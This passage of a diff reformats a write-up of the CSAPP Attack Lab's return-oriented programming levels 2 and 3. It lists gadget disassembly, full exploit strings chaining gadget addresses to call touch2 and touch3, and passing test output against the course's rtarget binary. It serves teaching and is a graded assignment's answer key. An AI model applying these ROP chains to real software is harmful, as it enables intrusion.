+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+00000000004019d0 <mid_farm>:
+  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
+  4019d5:	c3                   	retq 
 ```
 
 We can change our assembly code like this:
@@ -379,25 +623,45 @@ By searching the `table 1`, we can find that `popq %rax` can be represented as `
 We choose function `getval_280` as our first gadget
 
 ```asm
-00000000004019ca <getval_280>:  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax  4019cf:	c3                   	retq 
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq 
 ```
 **As we can see in the code, the first address of gadget should be `0x4019ca+0x2 = 0x4019cc`**
 
 For the second gadget, we can see that `movq %rax, %rdi; ret` should be represent as `48 89 c7 c3`, we can find this gadget from the function `addval_273`, where its first address should be `0x4019a0 + 0x2 = 0x4019a2`.
 
 ```asm
-00000000004019a0 <addval_273>:  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax  4019a6:	c3                   	retq    
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq    
 ```
 Thus the exploit string should be like this:
 
 ```
-00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00cc 19 40 00 00 00 00 00		<- The address for the first gadgetfa 97 b9 59 00 00 00 00		<- Cookie Valuea2 19 40 00 00 00 00 00		<- The address for the second gadgetec 17 40 00 00 00 00 00		<- The address of touch2()
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+cc 19 40 00 00 00 00 00		<- The address for the first gadget
+fa 97 b9 59 00 00 00 00		<- Cookie Value
+a2 19 40 00 00 00 00 00		<- The address for the second gadget
+ec 17 40 00 00 00 00 00		<- The address of touch2()
 ```
 
 We pass the test: 
 
 ```bash
-➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/RoP_Level2/ROP_Level2.txt | ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/RoP_Level2/ROP_Level2.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
 	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 
 	00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
 ```
@@ -414,7 +678,9 @@ Then, due to the **ASLR**, it is impossible to know what the exactly position of
 We can notice that there is no instruction encoding relationship for addition in the hexadecimal encoding table. Nevertheless, there has a complete addition function that exist in the gadget farm
 
 ```asm
-00000000004019d6 <add_xy>:  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax  4019da:	c3                   	retq   
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
 ```
 As we can see in the code, it add `%rdi`, `%rsi` and store in the `%rax` in the final. Thus, we can use this function that store the address of `%rsp` in the `%rdi` and store offset in the `%rsi`, then use this infomation to find the address of cookie value.
 
@@ -429,25 +695,101 @@ The step just like follow:
 Thus, we can get the assembly code like this:
 
 ```asm
-// Gadget 1 : From addval_190 (0x401a03+0x3 = 0x401a06)movq %rsp,%rax ret// Gadget 2 : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)movq %rax,%rdinopret// Gadget 3 : From addval_219 (0x4019a7 + 0x4 = 0x4019ab)popq %rax nop ret// Gadget 4 : From getval_481 (0x4019db + 0x2 = 0x4019db)movl %eax,%edx// Gadget 5 : From getval_159 (0x401a33 + 0x1 = 0x401a34)movl %edx,%ecx  cmpb %cl,%cl // Can skip this instrcution, cause no jmp instruction after thisret// Gadget 6 : From addval_436 (0x401a11 + 0x2 = 0x401a13)movl %ecx, %esinop nop ret// Gadget 7 : From the function of add_xy(0x4019d6)lea  (%rdi,%rsi,1),%raxret// Gadget 8(same as gadget2) : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)movq %rax,%rdi nop ret
+// Gadget 1 : From addval_190 (0x401a03+0x3 = 0x401a06)
+movq %rsp,%rax 
+ret
+// Gadget 2 : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)
+movq %rax,%rdi
+nop
+ret
+// Gadget 3 : From addval_219 (0x4019a7 + 0x4 = 0x4019ab)
+popq %rax 
+nop 
+ret
+// Gadget 4 : From getval_481 (0x4019db + 0x2 = 0x4019db)
+movl %eax,%edx
+// Gadget 5 : From getval_159 (0x401a33 + 0x1 = 0x401a34)
+movl %edx,%ecx  
+cmpb %cl,%cl // Can skip this instrcution, cause no jmp instruction after this
+ret
+// Gadget 6 : From addval_436 (0x401a11 + 0x2 = 0x401a13)
+movl %ecx, %esi
+nop 
+nop 
+ret
+// Gadget 7 : From the function of add_xy(0x4019d6)
+lea  (%rdi,%rsi,1),%rax
+ret
+// Gadget 8(same as gadget2) : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)
+movq %rax,%rdi 
+nop 
+ret
 ```
 
 Disassemly code show below:
 
-```asmmethod2.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 89 e0             	mov    %rsp,%rax   3:	c3                   	retq      4:	48 89 c7             	mov    %rax,%rdi   7:	90                   	nop   8:	c3                   	retq      9:	58                   	pop    %rax   a:	90                   	nop   b:	c3                   	retq      c:	89 c2                	mov    %eax,%edx   e:	89 d1                	mov    %edx,%ecx  10:	38 c9                	cmp    %cl,%cl  12:	c3                   	retq     13:	89 ce                	mov    %ecx,%esi  15:	90                   	nop  16:	90                   	nop  17:	c3                   	retq     18:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax  1c:	c3                   	retq     1d:	48 89 c7             	mov    %rax,%rdi  20:	90                   	nop  21:	c3                   	retq   
+```asm
+method2.o:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 89 e0             	mov    %rsp,%rax
+   3:	c3                   	retq   
+   4:	48 89 c7             	mov    %rax,%rdi
+   7:	90                   	nop
+   8:	c3                   	retq   
+   9:	58                   	pop    %rax
+   a:	90                   	nop
+   b:	c3                   	retq   
+   c:	89 c2                	mov    %eax,%edx
+   e:	89 d1                	mov    %edx,%ecx
+  10:	38 c9                	cmp    %cl,%cl
+  12:	c3                   	retq   
+  13:	89 ce                	mov    %ecx,%esi
+  15:	90                   	nop
+  16:	90                   	nop
+  17:	c3                   	retq   
+  18:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  1c:	c3                   	retq   
+  1d:	48 89 c7             	mov    %rax,%rdi
+  20:	90                   	nop
+  21:	c3                   	retq   
 ```
 Finally, we get the address of `$rsp(0x5561dca0)` in `$rdi` and the offset value `0x48(72)` in `$rsi`. Then we use the function `add_xy ` add them together and store in `$rax`. Finally, pass it to `$rdi` to fulfill the goal of pass string format of cookie value `35 39 62 39 39 37 66 61(see CI-Level3)` into `touch3()`.
 
 The final exploit string shown below:
 
 ```
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0006 1a 40 00 00 00 00 00  <- position of rsp, movq %rsp,%rax (Gadget1)c5 19 40 00 00 00 00 00  <- movq %rax,$rdi nop ret(Gadget2)ab 19 40 00 00 00 00 00  <- popq %rax nop ret(Gadget3)48 00 00 00 00 00 00 00  <- offset 0x48dd 19 40 00 00 00 00 00  <- movl %eax,$edx(Gadget4)34 1a 40 00 00 00 00 00  <- movl %edx, %ecx cmpb %cl(null) ret (Gadget5)13 1a 40 00 00 00 00 00  <- movl %ecx, %esi nop nop ret (Gadget6)d6 19 40 00 00 00 00 00  <- lea  (%rdi,%rsi,1),%rax ret (Gadget7: add_xy)c5 19 40 00 00 00 00 00  <-movq %rax,%rdi nop ret (Gadget8)fa 18 40 00 00 00 00 00  <- jump to touch3()35 39 62 39 39 37 66 61  <- position of string format of cookie value
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00  <- position of rsp, movq %rsp,%rax (Gadget1)
+c5 19 40 00 00 00 00 00  <- movq %rax,$rdi nop ret(Gadget2)
+ab 19 40 00 00 00 00 00  <- popq %rax nop ret(Gadget3)
+48 00 00 00 00 00 00 00  <- offset 0x48
+dd 19 40 00 00 00 00 00  <- movl %eax,$edx(Gadget4)
+34 1a 40 00 00 00 00 00  <- movl %edx, %ecx cmpb %cl(null) ret (Gadget5)
+13 1a 40 00 00 00 00 00  <- movl %ecx, %esi nop nop ret (Gadget6)
+d6 19 40 00 00 00 00 00  <- lea  (%rdi,%rsi,1),%rax ret (Gadget7: add_xy)
+c5 19 40 00 00 00 00 00  <-movq %rax,%rdi nop ret (Gadget8)
+fa 18 40 00 00 00 00 00  <- jump to touch3()
+35 39 62 39 39 37 66 61  <- position of string format of cookie value
 ```
 
 We have passed the test:
 
 ```bash
-➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/RoP_Level3/ROP_Level3.txt | ./rtarget -qCookie: 0x59b997faType string:Touch3!: You called touch3("59b997fa")Valid solution for level 3 with target rtargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/RoP_Level3/ROP_Level3.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 
 	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
 	06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 
 	00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 
@@ -455,6 +797,8 @@ We have passed the test:
 ```
 
 ### Attack Lab Finished
+
+## Reference
 
 [1]	ASLR wiki : [https://en.wikipedia.org/wiki/Address_space_layout_randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
 
